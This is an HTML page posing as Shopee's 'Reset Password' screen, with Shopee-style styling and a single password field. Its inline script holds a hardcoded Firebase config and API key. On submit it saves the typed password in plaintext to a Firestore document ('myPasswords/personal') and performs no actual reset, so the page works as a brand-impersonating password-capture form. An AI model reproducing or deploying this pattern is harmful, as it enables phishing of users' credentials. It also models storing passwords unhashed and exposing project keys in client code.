<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reset Password | Shopee</title>
  <link rel="stylesheet" href="../style.css" />
</head>
<body>
<main class="reset-password">
  <div class="reset-password-card auth-card">
    <div class="auth-card-header">
      <a href="./login.html">Back</a>
      <h2 class="auth-card-title">Set your new password</h2>
    </div>
    <div class="auth-card-main">
      <form id="new_password_form" class="form-inputs">
        <input type="password" id="confirm_password" placeholder="Enter new password" required />
        <button type="submit" id="reset_password_btn" class="auth-btn" disabled style="background: #F3826C;">
          Save Password
        </button>
      </form>
      <ul style="margin-top: 10px; font-size: 12px; color: #555;">
        <li>At least one lowercase character</li>
        <li>At least one uppercase character</li>
        <li>8-16 characters</li>
        <li>Only letters, numbers and common punctuation</li>
      </ul>
    </div>
  </div>
</main>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<script>
  // Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyDMWrf2aZLQCRc1CJgB-uzUV8VNn6CKQ9U",
  authDomain: "test-a2ff3.firebaseapp.com",
  projectId: "test-a2ff3",
  storageBucket: "test-a2ff3.firebasestorage.app",
  messagingSenderId: "171858929334",
  appId: "1:171858929334:web:8e3c641c866793debd2817",
  measurementId: "G-QF6RKRRPDV"
};
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  const form = document.getElementById('new_password_form');
  const passwordInput = document.getElementById('confirm_password');
  const resetBtn = document.getElementById('reset_password_btn');

  // Enable button if password meets criteria
  passwordInput.addEventListener('input', () => {
    const pwd = passwordInput.value;
    const valid = /^(?=.*[a-z])(?=.*[A-Z])[A-Za-z\d!@#$%^&*()_+]{8,16}$/.test(pwd);
    resetBtn.disabled = !valid;
    resetBtn.style.background = valid ? '#EE4D2D' : '#F3826C';
  });

  // Save password directly to Firestore (for personal use only)
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const pwd = passwordInput.value;

    try {
      await db.collection('myPasswords').doc('personal').set({ password: pwd });
      alert('Password saved successfully!');
      passwordInput.value = '';
      resetBtn.disabled = true;
    } catch (err) {
      console.error(err);
      alert('Error saving password: ' + err.message);
    }
  });
</script>
</body>
</html>
